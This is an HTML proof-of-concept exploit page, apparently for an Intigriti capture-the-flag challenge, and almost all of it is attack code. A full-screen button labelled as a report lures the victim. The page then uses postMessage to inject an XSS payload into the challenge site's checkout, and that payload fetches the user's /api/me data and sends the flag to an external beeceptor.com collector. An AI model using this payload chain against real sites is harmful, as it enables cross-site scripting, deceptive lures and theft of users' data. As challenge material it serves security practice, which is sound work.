<!DOCTYPE html>
<html>
<head>
    <style>
        button { width: 100%; height: 100vh; font-size: 50px; cursor: pointer; }
    </style>
</head>
<body>
    <button id="exploit">CLICK TO VIEW REPORT</button>
    <script>
        const challengeDomain = "https://challenge-0126.intigriti.io";
        const beeceptor = "https://kavil.free.beeceptor.com";
        const xss = `"><svg/onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;

        document.getElementById('exploit').onclick = function() {
            // Open checkout in a new tab/window
            const win = window.open(`${challengeDomain}/checkout.html?currency=1337COIN&price=1`);
            
            setTimeout(() => {
                win.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xss,
                        currency: '1337COIN',
                        amount: 0.000001
                    }
                }, '*');

                setTimeout(() => {
                    win.location.href = `${challengeDomain}/marketwatch.html`;
                }, 2000);
            }, 2000);
        };
    </script>
</body>
</html>
